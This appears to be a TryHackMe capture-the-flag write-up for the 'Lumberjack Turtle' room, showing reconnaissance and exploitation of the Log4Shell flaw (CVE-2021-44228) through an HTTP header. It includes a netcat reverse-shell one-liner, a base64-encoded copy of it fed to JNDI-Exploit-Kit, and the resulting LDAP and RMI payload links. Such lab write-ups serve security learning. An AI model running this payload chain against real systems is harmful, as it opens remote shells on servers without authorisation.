<h1 align="center">Lumberjack Turtle</h1>
<p align="center"><img width="80px" src=""><br>
July 3, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>423</code>-day-streak in<a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>No logs, no crime... so says the lumberjack.</em>.<br>
Access it <a href="https://tryhackme.com/room/lumberjackturtle"</a>here.<br>
<img width="1200px" src=""></p>

<br>




<br>

<h3>Nmap</h3>
<p>
  
- <code>22/ssh/OpenSSH 7.6p1</code><br>
- <code>80/nagios-nsca</code></p>

```bash
:~/LumberjackTurtle# git clone https://github.com/mbechler/marshalsec
Cloning into 'marshalsec'...
remote: Enumerating objects: 186, done.
remote: Counting objects: 100% (43/43), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 186 (delta 35), reused 28 (delta 28), pack-reused 143 (from 3)
Receiving objects: 100% (186/186), 481.95 KiB | 26.77 MiB/s, done.
Resolving deltas: 100% (91/91), done.
:~/LumberjackTurtle/marshalsec# sudo apt install maven
Reading package lists... Done
Building dependency tree       
...
:~/LumberjackTurtle/marshalsec# mvn clean package -DskipTests
...
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  48.390 s

```

<h3>dirb</h3>

<p>

- <code>/~logs</code><br>
- <code>/error</code></p>

```bash
:~/LumberjackTurtle# dirb http://lumberjackturtle.thm
...
URL_BASE: http://lumberjackturtle.thm/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://lumberjackturtle.thm/ ----
+ http://lumberjackturtle.thm/~logs (CODE:200|SIZE:29)                                                                                                                  
+ http://lumberjackturtle.thm/error (CODE:500|SIZE:73)                                                                                                                  
```

<p>- <code>/log4j</code></p>

```bash
:~/LumberjackTurtle# dirb http://lumberjackturtle.thm/~logs
...
URL_BASE: http://lumberjackturtle.thm/~logs/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                                                                           

---- Scanning URL: http://lumberjackturtle.thm/~logs/ ----
+ http://lumberjackturtle.thm/~logs/log4j (CODE:200|SIZE:47)                                                                                                           
```

```bash
:~/LumberjackTurtle# dirsearch -u http://lumberjackturtle.thm/~logs/ -w /usr/share/dirb/wordlists/common.txt

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 4613

Output File: /root/LumberjackTurtle/reports/http_lumberjackturtle.thm/_~logs__25-07-03_23-30-45.txt

Target: http://lumberjackturtle.thm/

[...] Starting: ~logs/
[...] 200 -   47B  - /~logs/log4j

Task Completed
                                                                                                    
```

<p>- <code>/log4j</code></p>

```bash
:~/LumberjackTurtle# dirb http://lumberjackturtle.thm/~logs
...
URL_BASE: http://lumberjackturtle.thm/~logs/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                                                                           

---- Scanning URL: http://lumberjackturtle.thm/~logs/ ----
+ http://lumberjackturtle.thm/~logs/log4j (CODE:200|SIZE:47)                                                                                                           
```

<br>

<h3>lumberjackturtle.thm/~logs/log4j</h3>

![image](https://github.com/user-attachments/assets/a59bbf10-beba-49fa-a293-f999ef8ed5b9)

![image](https://github.com/user-attachments/assets/b4da8e28-bc2f-4c1c-8140-5cc9d5486582)

<p>Forward</p>

![image](https://github.com/user-attachments/assets/85a9c80e-6ba8-45de-9a9d-cb2a0f24176a)

<br>

<h3>JNDI Exploit Kit</h3>

```bash
:~/LumberjackTurtle# git clone https://github.com/pimps/JNDI-Exploit-Kit
Cloning into 'JNDI-Exploit-Kit'...
remote: Enumerating objects: 499, done.
remote: Counting objects: 100% (74/74), done.
remote: Compressing objects: 100% (30/30), done.
remote: Total 499 (delta 55), reused 44 (delta 44), pack-reused 425 (from 1)
Receiving objects: 100% (499/499), 79.20 MiB | 32.61 MiB/s, done.
Resolving deltas: 100% (161/161), done.                                                                                                      
```

<br>

<h3>payload encoded base64</h3>

![image](https://github.com/user-attachments/assets/ceb89a93-ca32-43c2-a5a5-72979d937583)

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc AttackIP AttackPort >/tmp/f                                                           
```

<p>To Base64</p>

<br>

<h3>JNDI Exploit Kit</h3>

```bash
:~/LumberjackTurtle/JNDI-Exploit-Kit# java -jar target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -L "10.10.121.55:9999" -C "echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC4xNDEgNDQ0NCA+L3RtcC9m| base64 -d | bash"                                                                   _ _   _ _____ _____      ______            _       _ _          _  ___ _   
      | | \ | |  __ \_   _|    |  ____|          | |     (_) |        | |/ (_) |  
      | |  \| | |  | || |______| |__  __  ___ __ | | ___  _| |_ ______| ' / _| |_ 
  _   | | . ` | |  | || |______|  __| \ \/ / '_ \| |/ _ \| | __|______|  < | | __|
 | |__| | |\  | |__| || |_     | |____ >  <| |_) | | (_) | | |_       | . \| | |_ 
  \____/|_| \_|_____/_____|    |______/_/\_\ .__/|_|\___/|_|\__|      |_|\_\_|\__|
                                           | |                                    
                                           |_|               created by @welk1n 
                                                             modified by @pimps 

[HTTP_ADDR] >> 172.17.0.1
[RMI_ADDR] >> 172.17.0.1
[LDAP_ADDR] >> 10.10.121.55
[COMMAND] >> echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC4xNDEgNDQ0NCA+L3RtcC9m| base64 -d | bash
----------------------------JNDI Links---------------------------- 
Target environment(Build in JDK - (BYPASS WITH EL by @welk1n) whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
rmi://172.17.0.1:1099/xjd86y
Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
rmi://172.17.0.1:1099/sfisll
ldap://10.10.121.55:9999/sfisll
Target environment(Build in JDK - (BYPASS WITH GROOVY by @orangetw) whose trustURLCodebase is false and have Tomcat 8+ and Groovy in classpath):
rmi://172.17.0.1:1099/8qoa5i
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://172.17.0.1:1099/xpmbxe
ldap://10.10.121.55:9999/xpmbxe
Target environment(Build in JDK 1.6 whose trustURLCodebase is true):
rmi://172.17.0.1:1099/pssx6o
ldap://10.10.121.55:9999/pssx6o
Target environment(Build in JDK 1.5 whose trustURLCodebase is true):
rmi://172.17.0.1:1099/a3acwk
ldap://10.10.121.55:9999/a3acwk
...
```

<br>

<h3>curl</h3>

```bash

```


<p>ldap://10.10.121.55:9999/xsdwcr</p>

<p>Burp Suite > Repeater</p>

```bash

```
![image](https://github.com/user-attachments/assets/3424d6fd-9aa2-4cfc-ada8-b6fbc93bb39f)




![image](https://github.com/user-attachments/assets/f47a9ec8-c63c-4bdf-87e8-39a471166b4b)

![image](https://github.com/user-attachments/assets/99a9cb28-94c2-43fd-8482-13a47eb36576)

<br>

<h3><code>CVE-2021-44228</code> in <code>X-Api-Version</code></h3>

![image](https://github.com/user-attachments/assets/c448eedf-ceeb-4223-955a-41b74c3dca2f)

<br>

![image](https://github.com/user-attachments/assets/b0fce418-0531-4a0d-aef9-9558d14f8cd3)

![image](https://github.com/user-attachments/assets/53d458c3-14ee-4ddf-8fe5-b07c6faaf279)

<br>

<h3>maven</h3>

```bash
:~/LumberjackTurtle# sudo apt install maven
Reading package lists... Done
Building dependency tree       
Reading state information... Done
...                                                                                                   
```

